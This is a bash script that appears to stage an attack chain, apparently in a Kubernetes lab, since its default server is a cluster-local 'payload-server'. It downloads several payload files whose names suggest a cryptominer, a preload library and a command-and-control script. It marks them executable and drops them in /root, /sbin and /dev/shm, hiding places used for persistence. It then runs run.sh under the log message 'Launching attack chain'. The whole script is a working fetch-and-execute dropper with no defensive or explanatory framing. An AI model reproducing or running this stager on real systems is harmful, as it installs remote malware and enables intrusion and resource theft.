#!/bin/bash
set -e

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; N='\033[0m'
log() { echo -e "${1}[$(date +%T)] $2${N}"; }

PAYLOAD_SERVER=${PAYLOAD_SERVER:-"payload-server.default.svc.cluster.local"}
PAYLOAD_PORT=${PAYLOAD_PORT:-8080}
BASE="http://${PAYLOAD_SERVER}:${PAYLOAD_PORT}"

mkdir -p /tmp/payloads /sbin /dev/shm
cd /tmp/payloads

log "$Y" "Testing connectivity: $BASE"
curl -s --max-time 10 --connect-timeout 10 "$BASE/" >/dev/null 2>&1 || curl -s --max-time 10 "$BASE/config.json" >/dev/null || { log "$R" "Server unreachable"; exit 1; }

PAYLOADS="xmx2 www cc.py pt xmx2.so run.sh config.json noumt"
log "$Y" "Downloading $(echo $PAYLOADS | wc -w) payloads"

for p in $PAYLOADS; do
    curl -sf --max-time 10 "$BASE/$p" -o "$p" || { log "$R" "Failed: $p"; exit 1; }
    [ -s "$p" ] || { log "$R" "Empty: $p"; exit 1; }
done

log "$G" "Downloaded $(ls -1 | wc -l) files ($(du -sh . | cut -f1))"

chmod +x xmx2 www cc.py pt run.sh noumt
cp run.sh /root/run.sh
cp config.json /sbin/config.json 2>/dev/null
cp noumt /dev/shm/noumt 2>/dev/null

log "$G" "Launching attack chain"
exec bash /root/run.sh
